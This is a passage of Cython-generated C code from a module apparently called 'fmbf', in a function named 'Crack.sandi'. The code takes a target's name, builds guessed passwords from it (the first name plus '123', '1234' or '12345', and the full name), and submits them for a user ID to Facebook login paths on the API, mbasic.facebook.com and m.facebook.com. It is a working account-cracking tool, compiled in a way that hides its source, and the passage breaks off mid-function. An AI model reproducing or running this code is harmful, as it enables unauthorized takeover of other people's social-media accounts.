                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 238, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_2);
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __pyx_t_1 = __Pyx_GetItemInt(__pyx_t_2, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 238, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_1);
                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                __Pyx_XDECREF_SET(__pyx_v_nama, __pyx_t_1);
                __pyx_t_1 = 0;

                
                __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_nama, __pyx_n_s_split); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 239, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_2);
                __pyx_t_5 = NULL;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
                  __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_2);
                  if (likely(__pyx_t_5)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                    __Pyx_INCREF(__pyx_t_5);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_2, function);
                  }
                }
                __pyx_t_1 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_5, __pyx_kp_s__2) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_kp_s__2);
                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 239, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_1);
                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                __pyx_t_2 = __Pyx_GetItemInt(__pyx_t_1, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 239, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_2);
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_XDECREF_SET(__pyx_v_depan, __pyx_t_2);
                __pyx_t_2 = 0;

                
                __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_pw, __pyx_n_s_split); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_1);
                __pyx_t_5 = NULL;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
                  __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_1);
                  if (likely(__pyx_t_5)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                    __Pyx_INCREF(__pyx_t_5);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_1, function);
                  }
                }
                __pyx_t_2 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_5, __pyx_kp_s__58) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_kp_s__58);
                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 240, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_2);
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                if (likely(PyList_CheckExact(__pyx_t_2)) || PyTuple_CheckExact(__pyx_t_2)) {
                  __pyx_t_1 = __pyx_t_2; __Pyx_INCREF(__pyx_t_1); __pyx_t_14 = 0;
                  __pyx_t_15 = NULL;
                } else {
                  __pyx_t_14 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 240, __pyx_L15_error)
                  __Pyx_GOTREF(__pyx_t_1);
                  __pyx_t_15 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 240, __pyx_L15_error)
                }
                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                for (;;) {
                  if (likely(!__pyx_t_15)) {
                    if (likely(PyList_CheckExact(__pyx_t_1))) {
                      if (__pyx_t_14 >= PyList_GET_SIZE(__pyx_t_1)) break;
                      #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                      __pyx_t_2 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_14); __Pyx_INCREF(__pyx_t_2); __pyx_t_14++; if (unlikely(0 < 0)) __PYX_ERR(0, 240, __pyx_L15_error)
                      #else
                      __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_14); __pyx_t_14++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 240, __pyx_L15_error)
                      __Pyx_GOTREF(__pyx_t_2);
                      #endif
                    } else {
                      if (__pyx_t_14 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
                      #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                      __pyx_t_2 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_14); __Pyx_INCREF(__pyx_t_2); __pyx_t_14++; if (unlikely(0 < 0)) __PYX_ERR(0, 240, __pyx_L15_error)
                      #else
                      __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_14); __pyx_t_14++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 240, __pyx_L15_error)
                      __Pyx_GOTREF(__pyx_t_2);
                      #endif
                    }
                  } else {
                    __pyx_t_2 = __pyx_t_15(__pyx_t_1);
                    if (unlikely(!__pyx_t_2)) {
                      PyObject* exc_type = PyErr_Occurred();
                      if (exc_type) {
                        if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                        else __PYX_ERR(0, 240, __pyx_L15_error)
                      }
                      break;
                    }
                    __Pyx_GOTREF(__pyx_t_2);
                  }
                  __Pyx_XDECREF_SET(__pyx_v_z, __pyx_t_2);
                  __pyx_t_2 = 0;

                  
                  __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_pwx, __pyx_v_z); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 241, __pyx_L15_error)

                  
                }
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

                
                __pyx_t_14 = PyObject_Length(__pyx_v_nama); if (unlikely(__pyx_t_14 == ((Py_ssize_t)-1))) __PYX_ERR(0, 242, __pyx_L15_error)
                __pyx_t_17 = ((__pyx_t_14 <= 5) != 0);
                if (__pyx_t_17) {

                  
                  __pyx_t_14 = PyObject_Length(__pyx_v_depan); if (unlikely(__pyx_t_14 == ((Py_ssize_t)-1))) __PYX_ERR(0, 243, __pyx_L15_error)
                  __pyx_t_17 = ((__pyx_t_14 < 3) != 0);
                  if (__pyx_t_17) {
                    goto __pyx_L26;
                  }

                  
                   {
                    __pyx_t_1 = PyNumber_Add(__pyx_v_depan, __pyx_kp_s_123); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 246, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_1);
                    __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_pwx, __pyx_t_1); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 246, __pyx_L15_error)
                    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

                    
                    __pyx_t_1 = PyNumber_Add(__pyx_v_depan, __pyx_kp_s_1234); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 247, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_1);
                    __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_pwx, __pyx_t_1); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 247, __pyx_L15_error)
                    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

                    
                    __pyx_t_1 = PyNumber_Add(__pyx_v_depan, __pyx_kp_s_12345); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 248, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_1);
                    __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_pwx, __pyx_t_1); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 248, __pyx_L15_error)
                    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                  }
                  __pyx_L26:;

                  
                  goto __pyx_L25;
                }

                
                 {
                  __pyx_t_14 = PyObject_Length(__pyx_v_depan); if (unlikely(__pyx_t_14 == ((Py_ssize_t)-1))) __PYX_ERR(0, 250, __pyx_L15_error)
                  __pyx_t_17 = ((__pyx_t_14 < 3) != 0);
                  if (__pyx_t_17) {

                    
                    __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_pwx, __pyx_v_nama); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 251, __pyx_L15_error)

                    
                    goto __pyx_L27;
                  }

                  
                   {
                    __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_pwx, __pyx_v_nama); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 253, __pyx_L15_error)

                    
                    __pyx_t_1 = PyNumber_Add(__pyx_v_depan, __pyx_kp_s_123); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 254, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_1);
                    __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_pwx, __pyx_t_1); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 254, __pyx_L15_error)
                    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

                    
                    __pyx_t_1 = PyNumber_Add(__pyx_v_depan, __pyx_kp_s_1234); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 255, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_1);
                    __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_pwx, __pyx_t_1); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 255, __pyx_L15_error)
                    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

                    
                    __pyx_t_1 = PyNumber_Add(__pyx_v_depan, __pyx_kp_s_12345); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 256, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_1);
                    __pyx_t_16 = __Pyx_PyList_Append(__pyx_v_pwx, __pyx_t_1); if (unlikely(__pyx_t_16 == ((int)-1))) __PYX_ERR(0, 256, __pyx_L15_error)
                    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                  }
                  __pyx_L27:;
                }
                __pyx_L25:;

                
                __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_mtd); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 257, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_1);
                __pyx_t_17 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_api, __pyx_t_1, Py_EQ)); if (unlikely(__pyx_t_17 < 0)) __PYX_ERR(0, 257, __pyx_L15_error)
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __pyx_t_18 = (__pyx_t_17 != 0);
                if (__pyx_t_18) {

                  
                  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_fall, __pyx_n_s_submit); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 258, __pyx_L15_error)
                  __Pyx_GOTREF(__pyx_t_2);
                  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_metode_api); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 258, __pyx_L15_error)
                  __Pyx_GOTREF(__pyx_t_5);
                  __pyx_t_19 = NULL;
                  __pyx_t_20 = 0;
                  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
                    __pyx_t_19 = PyMethod_GET_SELF(__pyx_t_2);
                    if (likely(__pyx_t_19)) {
                      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                      __Pyx_INCREF(__pyx_t_19);
                      __Pyx_INCREF(function);
                      __Pyx_DECREF_SET(__pyx_t_2, function);
                      __pyx_t_20 = 1;
                    }
                  }
                  #if CYTHON_FAST_PYCALL
                  if (PyFunction_Check(__pyx_t_2)) {
                    PyObject *__pyx_temp[4] = {__pyx_t_19, __pyx_t_5, __pyx_v_user, __pyx_v_pwx};
                    __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_20, 3+__pyx_t_20); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 258, __pyx_L15_error)
                    __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
                    __Pyx_GOTREF(__pyx_t_1);
                    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                  } else
                  #endif
                  #if CYTHON_FAST_PYCCALL
                  if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
                    PyObject *__pyx_temp[4] = {__pyx_t_19, __pyx_t_5, __pyx_v_user, __pyx_v_pwx};
                    __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_20, 3+__pyx_t_20); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 258, __pyx_L15_error)
                    __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
                    __Pyx_GOTREF(__pyx_t_1);
                    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                  } else
                  #endif
                  {
                    __pyx_t_21 = PyTuple_New(3+__pyx_t_20); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 258, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_21);
                    if (__pyx_t_19) {
                      __Pyx_GIVEREF(__pyx_t_19); PyTuple_SET_ITEM(__pyx_t_21, 0, __pyx_t_19); __pyx_t_19 = NULL;
                    }
                    __Pyx_GIVEREF(__pyx_t_5);
                    PyTuple_SET_ITEM(__pyx_t_21, 0+__pyx_t_20, __pyx_t_5);
                    __Pyx_INCREF(__pyx_v_user);
                    __Pyx_GIVEREF(__pyx_v_user);
                    PyTuple_SET_ITEM(__pyx_t_21, 1+__pyx_t_20, __pyx_v_user);
                    __Pyx_INCREF(__pyx_v_pwx);
                    __Pyx_GIVEREF(__pyx_v_pwx);
                    PyTuple_SET_ITEM(__pyx_t_21, 2+__pyx_t_20, __pyx_v_pwx);
                    __pyx_t_5 = 0;
                    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_21, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 258, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_1);
                    __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                  }
                  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

                  
                  goto __pyx_L28;
                }

                
                __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_mtd); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 259, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_1);
                __pyx_t_18 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_mbasic, __pyx_t_1, Py_EQ)); if (unlikely(__pyx_t_18 < 0)) __PYX_ERR(0, 259, __pyx_L15_error)
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __pyx_t_17 = (__pyx_t_18 != 0);
                if (__pyx_t_17) {

                  
                  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_fall, __pyx_n_s_submit); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 260, __pyx_L15_error)
                  __Pyx_GOTREF(__pyx_t_2);
                  __pyx_t_21 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_metode_validate); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 260, __pyx_L15_error)
                  __Pyx_GOTREF(__pyx_t_21);
                  __pyx_t_5 = NULL;
                  __pyx_t_20 = 0;
                  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
                    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_2);
                    if (likely(__pyx_t_5)) {
                      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                      __Pyx_INCREF(__pyx_t_5);
                      __Pyx_INCREF(function);
                      __Pyx_DECREF_SET(__pyx_t_2, function);
                      __pyx_t_20 = 1;
                    }
                  }
                  #if CYTHON_FAST_PYCALL
                  if (PyFunction_Check(__pyx_t_2)) {
                    PyObject *__pyx_temp[5] = {__pyx_t_5, __pyx_t_21, __pyx_v_user, __pyx_v_pwx, __pyx_kp_s_mbasic_facebook_com};
                    __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_20, 4+__pyx_t_20); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 260, __pyx_L15_error)
                    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                    __Pyx_GOTREF(__pyx_t_1);
                    __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                  } else
                  #endif
                  #if CYTHON_FAST_PYCCALL
                  if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
                    PyObject *__pyx_temp[5] = {__pyx_t_5, __pyx_t_21, __pyx_v_user, __pyx_v_pwx, __pyx_kp_s_mbasic_facebook_com};
                    __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_20, 4+__pyx_t_20); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 260, __pyx_L15_error)
                    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                    __Pyx_GOTREF(__pyx_t_1);
                    __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                  } else
                  #endif
                  {
                    __pyx_t_19 = PyTuple_New(4+__pyx_t_20); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 260, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_19);
                    if (__pyx_t_5) {
                      __Pyx_GIVEREF(__pyx_t_5); PyTuple_SET_ITEM(__pyx_t_19, 0, __pyx_t_5); __pyx_t_5 = NULL;
                    }
                    __Pyx_GIVEREF(__pyx_t_21);
                    PyTuple_SET_ITEM(__pyx_t_19, 0+__pyx_t_20, __pyx_t_21);
                    __Pyx_INCREF(__pyx_v_user);
                    __Pyx_GIVEREF(__pyx_v_user);
                    PyTuple_SET_ITEM(__pyx_t_19, 1+__pyx_t_20, __pyx_v_user);
                    __Pyx_INCREF(__pyx_v_pwx);
                    __Pyx_GIVEREF(__pyx_v_pwx);
                    PyTuple_SET_ITEM(__pyx_t_19, 2+__pyx_t_20, __pyx_v_pwx);
                    __Pyx_INCREF(__pyx_kp_s_mbasic_facebook_com);
                    __Pyx_GIVEREF(__pyx_kp_s_mbasic_facebook_com);
                    PyTuple_SET_ITEM(__pyx_t_19, 3+__pyx_t_20, __pyx_kp_s_mbasic_facebook_com);
                    __pyx_t_21 = 0;
                    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_19, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 260, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_1);
                    __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
                  }
                  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

                  
                  goto __pyx_L28;
                }

                
                __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_mtd); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 261, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_1);
                __pyx_t_17 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_mobile, __pyx_t_1, Py_EQ)); if (unlikely(__pyx_t_17 < 0)) __PYX_ERR(0, 261, __pyx_L15_error)
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __pyx_t_18 = (__pyx_t_17 != 0);
                if (__pyx_t_18) {

                  
                  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_fall, __pyx_n_s_submit); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 262, __pyx_L15_error)
                  __Pyx_GOTREF(__pyx_t_2);
                  __pyx_t_19 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_metode_validate); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 262, __pyx_L15_error)
                  __Pyx_GOTREF(__pyx_t_19);
                  __pyx_t_21 = NULL;
                  __pyx_t_20 = 0;
                  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
                    __pyx_t_21 = PyMethod_GET_SELF(__pyx_t_2);
                    if (likely(__pyx_t_21)) {
                      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                      __Pyx_INCREF(__pyx_t_21);
                      __Pyx_INCREF(function);
                      __Pyx_DECREF_SET(__pyx_t_2, function);
                      __pyx_t_20 = 1;
                    }
                  }
                  #if CYTHON_FAST_PYCALL
                  if (PyFunction_Check(__pyx_t_2)) {
                    PyObject *__pyx_temp[5] = {__pyx_t_21, __pyx_t_19, __pyx_v_user, __pyx_v_pwx, __pyx_kp_s_m_facebook_com};
                    __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_20, 4+__pyx_t_20); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 262, __pyx_L15_error)
                    __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                    __Pyx_GOTREF(__pyx_t_1);
                    __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
                  } else
                  #endif
                  #if CYTHON_FAST_PYCCALL
                  if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
                    PyObject *__pyx_temp[5] = {__pyx_t_21, __pyx_t_19, __pyx_v_user, __pyx_v_pwx, __pyx_kp_s_m_facebook_com};
                    __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp+1-__pyx_t_20, 4+__pyx_t_20); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 262, __pyx_L15_error)
                    __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                    __Pyx_GOTREF(__pyx_t_1);
                    __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
                  } else
                  #endif
                  {
                    __pyx_t_5 = PyTuple_New(4+__pyx_t_20); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 262, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_5);
                    if (__pyx_t_21) {
                      __Pyx_GIVEREF(__pyx_t_21); PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_21); __pyx_t_21 = NULL;
                    }
                    __Pyx_GIVEREF(__pyx_t_19);
                    PyTuple_SET_ITEM(__pyx_t_5, 0+__pyx_t_20, __pyx_t_19);
                    __Pyx_INCREF(__pyx_v_user);
                    __Pyx_GIVEREF(__pyx_v_user);
                    PyTuple_SET_ITEM(__pyx_t_5, 1+__pyx_t_20, __pyx_v_user);
                    __Pyx_INCREF(__pyx_v_pwx);
                    __Pyx_GIVEREF(__pyx_v_pwx);
                    PyTuple_SET_ITEM(__pyx_t_5, 2+__pyx_t_20, __pyx_v_pwx);
                    __Pyx_INCREF(__pyx_kp_s_m_facebook_com);
                    __Pyx_GIVEREF(__pyx_kp_s_m_facebook_com);
                    PyTuple_SET_ITEM(__pyx_t_5, 3+__pyx_t_20, __pyx_kp_s_m_facebook_com);
                    __pyx_t_19 = 0;
                    __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_5, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 262, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_1);
                    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
                  }
                  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
                  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

                  
                }
                __pyx_L28:;

                
              }
              __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
              __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
              __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
              goto __pyx_L22_try_end;
              __pyx_L15_error:;
              __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
              __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
              __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
              __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;

              
               {
                __Pyx_AddTraceback("fmbf.Crack.sandi", __pyx_clineno, __pyx_lineno, __pyx_filename);
                if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_2, &__pyx_t_5) < 0) __PYX_ERR(0, 263, __pyx_L17_except_error)
                __Pyx_GOTREF(__pyx_t_1);
                __Pyx_GOTREF(__pyx_t_2);
                __Pyx_GOTREF(__pyx_t_5);

                
                __pyx_t_19 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_mtd); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 264, __pyx_L17_except_error)
                __Pyx_GOTREF(__pyx_t_19);
                __pyx_t_18 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_api, __pyx_t_19, Py_EQ)); if (unlikely(__pyx_t_18 < 0)) __PYX_ERR(0, 264, __pyx_L17_except_error)
                __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
                __pyx_t_17 = (__pyx_t_18 != 0);
                if (__pyx_t_17) {

                  
                  __pyx_t_21 = __Pyx_PyObject_GetAttrStr(__pyx_v_fall, __pyx_n_s_submit); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 265, __pyx_L17_except_error)
                  __Pyx_GOTREF(__pyx_t_21);
                  __pyx_t_22 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_metode_api); if (unlikely(!__pyx_t_22)) __PYX_ERR(0, 265, __pyx_L17_except_error)
                  __Pyx_GOTREF(__pyx_t_22);
                  if (unlikely(!__pyx_v_user)) { __Pyx_RaiseUnboundLocalError("user"); __PYX_ERR(0, 265, __pyx_L17_except_error) }
                  if (unlikely(!__pyx_v_pwx)) { __Pyx_RaiseUnboundLocalError("pwx"); __PYX_ERR(0, 265, __pyx_L17_except_error) }
                  __pyx_t_23 = NULL;
                  __pyx_t_20 = 0;
                  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_21))) {
                    __pyx_t_23 = PyMethod_GET_SELF(__pyx_t_21);
                    if (likely(__pyx_t_23)) {
                      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_21);
                      __Pyx_INCREF(__pyx_t_23);
                      __Pyx_INCREF(function);
                      __Pyx_DECREF_SET(__pyx_t_21, function);
                      __pyx_t_20 = 1;
                    }
                  }
                  #if CYTHON_FAST_PYCALL
                  if (PyFunction_Check(__pyx_t_21)) {
                    PyObject *__pyx_temp[4] = {__pyx_t_23, __pyx_t_22, __pyx_v_user, __pyx_v_pwx};
                    __pyx_t_19 = __Pyx_PyFunction_FastCall(__pyx_t_21, __pyx_temp+1-__pyx_t_20, 3+__pyx_t_20); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 265, __pyx_L17_except_error)
                    __Pyx_XDECREF(__pyx_t_23); __pyx_t_23 = 0;
                    __Pyx_GOTREF(__pyx_t_19);
                    __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
                  } else
                  #endif
                  #if CYTHON_FAST_PYCCALL
                  if (__Pyx_PyFastCFunction_Check(__pyx_t_21)) {
                    PyObject *__pyx_temp[4] = {__pyx_t_23, __pyx_t_22, __pyx_v_user, __pyx_v_pwx};
                    __pyx_t_19 = __Pyx_PyCFunction_FastCall(__pyx_t_21, __pyx_temp+1-__pyx_t_20, 3+__pyx_t_20); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 265, __pyx_L17_except_error)
                    __Pyx_XDECREF(__pyx_t_23); __pyx_t_23 = 0;
                    __Pyx_GOTREF(__pyx_t_19);
                    __Pyx_DECREF(__pyx_t_22); __pyx_t_22 = 0;
                  } else
                  #endif
                  {
                    __pyx_t_24 = PyTuple_New(3+__pyx_t_20); if (unlikely(!__pyx_t_24)) __PYX_ERR(0, 265, __pyx_L17_except_error)
                    __Pyx_GOTREF(__pyx_t_24);
                    if (__pyx_t_23) {
                      __Pyx_GIVEREF(__pyx_t_23); PyTuple_SET_ITEM(__pyx_t_24, 0, __pyx_t_23); __pyx_t_23 = NULL;
                    }
                    __Pyx_GIVEREF(__pyx_t_22);
                    PyTuple_SET_ITEM(__pyx_t_24, 0+__pyx_t_20, __pyx_t_22);
                    __Pyx_INCREF(__pyx_v_user);
                    __Pyx_GIVEREF(__pyx_v_user);
                    PyTuple_SET_ITEM(__pyx_t_24, 1+__pyx_t_20, __pyx_v_user);
                    __Pyx_INCREF(__pyx_v_pwx);
                    __Pyx_GIVEREF(__pyx_v_pwx);
                    PyTuple_SET_ITEM(__pyx_t_24, 2+__pyx_t_20, __pyx_v_pwx);
                    __pyx_t_22 = 0;
